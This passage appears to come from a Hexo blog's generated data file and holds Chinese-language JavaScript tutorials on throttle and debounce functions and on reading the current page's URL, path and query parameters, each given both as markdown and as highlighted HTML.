class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 频率控制 返回函数连续调用时，func 执行频率限定为 次 / wait</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;function&#125;   func      传入函数</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;number&#125;     wait      表示时间窗口的间隔</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;object&#125;     options   如果想忽略开始边界上的调用，传入&#123;leading: false&#125;。</span></span><br><span class=\"line\"><span class=\"comment\"> *                                如果想忽略结尾边界上的调用，传入&#123;trailing: false&#125;</span></span><br><span class=\"line\"><span class=\"comment\"> * @return &#123;function&#125;             返回客户调用函数   </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">_.throttle = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">func, wait, options</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> context, args, result;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"comment\">// 上次执行时间点</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> previous = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!options) options = &#123;&#125;;</span><br><span class=\"line\">  <span class=\"comment\">// 延迟执行函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> later = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 若设定了开始边界不执行选项，上次执行时间始终为0</span></span><br><span class=\"line\">    previous = options.leading === <span class=\"literal\">false</span> ? <span class=\"number\">0</span> : _.now();</span><br><span class=\"line\">    timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    result = func.apply(context, args);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!timeout) context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> now = _.now();</span><br><span class=\"line\">    <span class=\"comment\">// 首次执行时，如果设定了开始边界不执行选项，将上次执行时间设定为当前时间。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!previous &amp;&amp; options.leading === <span class=\"literal\">false</span>) previous = now;</span><br><span class=\"line\">    <span class=\"comment\">// 延迟执行时间间隔</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> remaining = wait - (now - previous);</span><br><span class=\"line\">    context = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 延迟时间间隔remaining小于等于0，表示上次执行至此所间隔时间已经超过一个时间窗口</span></span><br><span class=\"line\">    <span class=\"comment\">// remaining大于时间窗口wait，表示客户端系统时间被调整过</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (remaining &lt;= <span class=\"number\">0</span> || remaining &gt; wait) &#123;</span><br><span class=\"line\">      clearTimeout(timeout);</span><br><span class=\"line\">      timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      previous = now;</span><br><span class=\"line\">      result = func.apply(context, args);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!timeout) context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"comment\">//如果延迟执行不存在，且没有设定结尾边界不执行选项</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!timeout &amp;&amp; options.trailing !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">      timeout = setTimeout(later, remaining);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>debounce：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 空闲控制 返回函数连续调用时，空闲时间必须大于或等于 wait，func 才会执行</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;function&#125; func        传入函数(实际要执行的函数)</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;number&#125;   wait        表示时间窗口的间隔</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;boolean&#125;  immediate   设置为ture时，调用触发于开始边界而不是结束边界</span></span><br><span class=\"line\"><span class=\"comment\"> * @return &#123;function&#125;             返回客户调用函数</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">_.debounce = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">func, wait, immediate</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> timeout, args, context, timestamp, result;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> later = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 据上一次触发时间间隔</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> last = _.now() - timestamp;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 上次被包装函数被调用时间间隔last小于设定时间间隔wait</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (last &lt; wait &amp;&amp; last &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      timeout = setTimeout(later, wait - last);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"comment\">// 如果设定为immediate===true，因为开始边界已经调用过了此处无需调用</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!immediate) &#123;</span><br><span class=\"line\">        result = func.apply(context, args);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!timeout) context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    context = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    timestamp = _.now();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> callNow = immediate &amp;&amp; !timeout;</span><br><span class=\"line\">    <span class=\"comment\">// 如果延时不存在，重新设定延时</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!timeout) timeout = setTimeout(later, wait);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (callNow) &#123;</span><br><span class=\"line\">      result = func.apply(context, args);</span><br><span class=\"line\">      context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"3、使用场景\"><a href=\"#3、使用场景\" class=\"headerlink\" title=\"3、使用场景\"></a><a>3、使用场景</a></h4><p>  <strong>只要牵涉到连续事件或频率控制相关的应用都可以考虑到这两个函数，比如：</strong></p>\n<ul>\n<li>游戏射击，keydown 事件</li>\n<li>文本输入、自动完成，keyup 事件</li>\n<li>鼠标移动，mousemove 事件</li>\n<li>DOM 元素动态定位，window 对象的 resize 和 scroll 事件</li>\n</ul>\n<p>前两者 debounce 和 throttle 都可以按需使用；后两者肯定是用 throttle 了。如果不做过滤处理，每秒种甚至会触发数十次相应的事件。尤其是 mousemove 事件，每移动一像素都可能触发一次事件。如果是在一个画布上做一个鼠标相关的应用，过滤事件处理是必须的，否则肯定会造成糟糕的体验。</p>\n"},{"id":"0809016","title":"JS获取当前URL信息","date":"2017-10-23T02:56:54.000Z","_content":"\n1. 获取当前域名：\n```js\n// 方法一\nvar domain = document.domain;\n// 方法二\nvar domain = window.location.host;\n\n// 由于获取到的当前域名不包括 `http://`，所以把获取到的域名赋给 a 标签的 href 时，别忘了加上 `http://`，否则单击链接时导航会出错,\n// 当然也可以使用 `var origin = window.location.origin` 获取协议名+域名\n```\n2. 获取当前 `Url` 的4种方法：\n```js\nvar url = window.location.href;\nvar url = self.location.href;\nvar url = document.URL;\nvar url = document.location;\n\n// 地址栏显示的是什么，获取到的 `url` 就是什么。\n```\n3. 获取当前相对路径：\n```js\n//首先获取 `Url`，然后把 `Url` 通过 `//` 截成两部分，再从后一部分中截取相对路径。如果截取到的相对路径中有参数，则把参数去掉。\nfunction GetUrlRelativePath() {\nvar url = document.location.toString();\nvar arrUrl = url.split(\"//\");\n\nvar start = arrUrl[1].indexOf(\"/\");\nvar relUrl = arrUrl[1].substring(start);  //stop省略，截取从start开始到结尾的所有字符\n\nif(relUrl.indexOf(\"?\") != -1){\n    relUrl = relUrl.split(\"?\")[0];\n}\nreturn relUrl;\n}\n\n// 调用方法：GetUrlRelativePath();\n// 假如当前 `Url` 是 `https://www.baidu.com/s?ie=utf-8&f=3&rsv_bp=1&rsv_idx=1`，\n// 则截取到的相对路径为：`/s`。\n```\n4. 获取当前 `Url` 的参数\n```js\n// 获取 Url 参数部分\nfunction GetUrlPara(){\nvar url = document.location.toString();\nvar arrUrl = url.split(\"?\");\n\nvar para = arrUrl[1];\nreturn para;\n}\n\n// 调用方法：GetUrlPara()\n\n// 举例：假如当前 `Url` 是 `https://www.baidu.com/s?ie=utf-8&f=3&rsv_bp=1&rsv_idx=1`，\n// 则截取到的参数部分为：`ie=utf-8&f=3&rsv_bp=1&rsv_idx=1`。\n```\n5. 获取指定 `Url` 参数的方法\n```js\nfunction GetUrlParam(paraName) {\nvar url = document.location.toString();\nvar arrObj = url.split(\"?\");\n\nif (arrObj.length > 1) {\n    var arrPara = arrObj[1].split(\"&\");\n    var arr;\n\n    for (var i = 0; i < arrPara.length; i++) {\n    arr = arrPara[i].split(\"=\");\n\n    if (arr != null && arr[0] == paraName) {\n        return arr[1];\n    }\n    }\n    return \"\";\n\n} else {\n    return \"\";\n}\n}\n\n// 调用方法：GetUrlParam(\"id\");\n// 假如当网页的网址有这样的参数 `test.htm?id=896&s=q&p=5`，则调用 `GetUrlParam(\"p\")`，返回 5。\n```","source":"_posts/0809016_JS获取当前URL信息.md","raw":"---\nid: 0809016\ntitle: JS获取当前URL信息\ndate: 2017-10-23 10:56:54\ntags:\n    - JavaScript\ncategories:\n---\n\n1. 获取当前域名：\n```js\n// 方法一\nvar domain = document.domain;\n// 方法二\nvar domain = window.location.host;\n\n// 由于获取到的当前域名不包括 `http://`，所以把获取到的域名赋给 a 标签的 href 时，别忘了加上 `http://`，否则单击链接时导航会出错,\n// 当然也可以使用 `var origin = window.location.origin` 获取协议名+域名\n```\n2. 获取当前 `Url` 的4种方法：\n```js\nvar url = window.location.href;\nvar url = self.location.href;\nvar url = document.URL;\nvar url = document.location;\n\n// 地址栏显示的是什么，获取到的 `url` 就是什么。\n```\n3. 获取当前相对路径：\n```js\n//首先获取 `Url`，然后把 `Url` 通过 `//` 截成两部分，再从后一部分中截取相对路径。如果截取到的相对路径中有参数，则把参数去掉。\nfunction GetUrlRelativePath() {\nvar url = document.location.toString();\nvar arrUrl = url.split(\"//\");\n\nvar start = arrUrl[1].indexOf(\"/\");\nvar relUrl = arrUrl[1].substring(start);  //stop省略，截取从start开始到结尾的所有字符\n\nif(relUrl.indexOf(\"?\") != -1){\n    relUrl = relUrl.split(\"?\")[0];\n}\nreturn relUrl;\n}\n\n// 调用方法：GetUrlRelativePath();\n// 假如当前 `Url` 是 `https://www.baidu.com/s?ie=utf-8&f=3&rsv_bp=1&rsv_idx=1`，\n// 则截取到的相对路径为：`/s`。\n```\n4. 获取当前 `Url` 的参数\n```js\n// 获取 Url 参数部分\nfunction GetUrlPara(){\nvar url = document.location.toString();\nvar arrUrl = url.split(\"?\");\n\nvar para = arrUrl[1];\nreturn para;\n}\n\n// 调用方法：GetUrlPara()\n\n// 举例：假如当前 `Url` 是 `https://www.baidu.com/s?ie=utf-8&f=3&rsv_bp=1&rsv_idx=1`，\n// 则截取到的参数部分为：`ie=utf-8&f=3&rsv_bp=1&rsv_idx=1`。\n```\n5. 获取指定 `Url` 参数的方法\n```js\nfunction GetUrlParam(paraName) {\nvar url = document.location.toString();\nvar arrObj = url.split(\"?\");\n\nif (arrObj.length > 1) {\n    var arrPara = arrObj[1].split(\"&\");\n    var arr;\n\n    for (var i = 0; i < arrPara.length; i++) {\n    arr = arrPara[i].split(\"=\");\n\n    if (arr != null && arr[0] == paraName) {\n        return arr[1];\n    }\n    }\n    return \"\";\n\n} else {\n    return \"\";\n}\n}\n\n// 调用方法：GetUrlParam(\"id\");\n// 假如当网页的网址有这样的参数 `test.htm?id=896&s=q&p=5`，则调用 `GetUrlParam(\"p\")`，返回 5。\n```","slug":"0809016_JS获取当前URL信息","published":1,"updated":"2018-03-27T03:31:55.539Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvve0024s4c0cy878cnj","content":"<ol>\n<li><p>获取当前域名：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 方法一</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> domain = <span class=\"built_in\">document</span>.domain;</span><br><span class=\"line\"><span class=\"comment\">// 方法二</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> domain = <span class=\"built_in\">window</span>.location.host;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 由于获取到的当前域名不包括 `http://`，所以把获取到的域名赋给 a 标签的 href 时，别忘了加上 `http://`，否则单击链接时导航会出错,</span></span><br><span class=\"line\"><span class=\"comment\">// 当然也可以使用 `var origin = window.location.origin` 获取协议名+域名</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取当前 <code>Url</code> 的4种方法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">window</span>.location.href;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = self.location.href;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.URL;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 地址栏显示的是什么，获取到的 `url` 就是什么。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取当前相对路径：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//首先获取 `Url`，然后把 `Url` 通过 `//` 截成两部分，再从后一部分中截取相对路径。如果截取到的相对路径中有参数，则把参数去掉。</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">GetUrlRelativePath</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location.toString();</span><br><span class=\"line\"><span class=\"keyword\">var</span> arrUrl = url.split(<span class=\"string\">\"//\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> start = arrUrl[<span class=\"number\">1</span>].indexOf(<span class=\"string\">\"/\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> relUrl = arrUrl[<span class=\"number\">1</span>].substring(start);  <span class=\"comment\">//stop省略，截取从start开始到结尾的所有字符</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(relUrl.indexOf(<span class=\"string\">\"?\"</span>) != <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">    relUrl = relUrl.split(<span class=\"string\">\"?\"</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> relUrl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方法：GetUrlRelativePath();</span></span><br><span class=\"line\"><span class=\"comment\">// 假如当前 `Url` 是 `https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=1`，</span></span><br><span class=\"line\"><span class=\"comment\">// 则截取到的相对路径为：`/s`。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取当前 <code>Url</code> 的参数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取 Url 参数部分</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">GetUrlPara</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location.toString();</span><br><span class=\"line\"><span class=\"keyword\">var</span> arrUrl = url.split(<span class=\"string\">\"?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> para = arrUrl[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"keyword\">return</span> para;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方法：GetUrlPara()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 举例：假如当前 `Url` 是 `https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=1`，</span></span><br><span class=\"line\"><span class=\"comment\">// 则截取到的参数部分为：`ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=1`。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取指定 <code>Url</code> 参数的方法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">GetUrlParam</span>(<span class=\"params\">paraName</span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location.toString();</span><br><span class=\"line\"><span class=\"keyword\">var</span> arrObj = url.split(<span class=\"string\">\"?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (arrObj.length &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> arrPara = arrObj[<span class=\"number\">1</span>].split(<span class=\"string\">\"&amp;\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> arr;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; arrPara.length; i++) &#123;</span><br><span class=\"line\">    arr = arrPara[i].split(<span class=\"string\">\"=\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (arr != <span class=\"literal\">null</span> &amp;&amp; arr[<span class=\"number\">0</span>] == paraName) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> arr[<span class=\"number\">1</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方法：GetUrlParam(\"id\");</span></span><br><span class=\"line\"><span class=\"comment\">// 假如当网页的网址有这样的参数 `test.htm?id=896&amp;s=q&amp;p=5`，则调用 `GetUrlParam(\"p\")`，返回 5。</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>获取当前域名：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 方法一</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> domain = <span class=\"built_in\">document</span>.domain;</span><br><span class=\"line\"><span class=\"comment\">// 方法二</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> domain = <span class=\"built_in\">window</span>.location.host;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 由于获取到的当前域名不包括 `http://`，所以把获取到的域名赋给 a 标签的 href 时，别忘了加上 `http://`，否则单击链接时导航会出错,</span></span><br><span class=\"line\"><span class=\"comment\">// 当然也可以使用 `var origin = window.location.origin` 获取协议名+域名</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取当前 <code>Url</code> 的4种方法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">window</span>.location.href;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = self.location.href;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.URL;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 地址栏显示的是什么，获取到的 `url` 就是什么。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取当前相对路径：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//首先获取 `Url`，然后把 `Url` 通过 `//` 截成两部分，再从后一部分中截取相对路径。如果截取到的相对路径中有参数，则把参数去掉。</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">GetUrlRelativePath</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location.toString();</span><br><span class=\"line\"><span class=\"keyword\">var</span> arrUrl = url.split(<span class=\"string\">\"//\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> start = arrUrl[<span class=\"number\">1</span>].indexOf(<span class=\"string\">\"/\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> relUrl = arrUrl[<span class=\"number\">1</span>].substring(start);  <span class=\"comment\">//stop省略，截取从start开始到结尾的所有字符</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(relUrl.indexOf(<span class=\"string\">\"?\"</span>) != <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">    relUrl = relUrl.split(<span class=\"string\">\"?\"</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> relUrl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方法：GetUrlRelativePath();</span></span><br><span class=\"line\"><span class=\"comment\">// 假如当前 `Url` 是 `https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=1`，</span></span><br><span class=\"line\"><span class=\"comment\">// 则截取到的相对路径为：`/s`。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取当前 <code>Url</code> 的参数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取 Url 参数部分</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">GetUrlPara</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location.toString();</span><br><span class=\"line\"><span class=\"keyword\">var</span> arrUrl = url.split(<span class=\"string\">\"?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> para = arrUrl[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"keyword\">return</span> para;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方法：GetUrlPara()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 举例：假如当前 `Url` 是 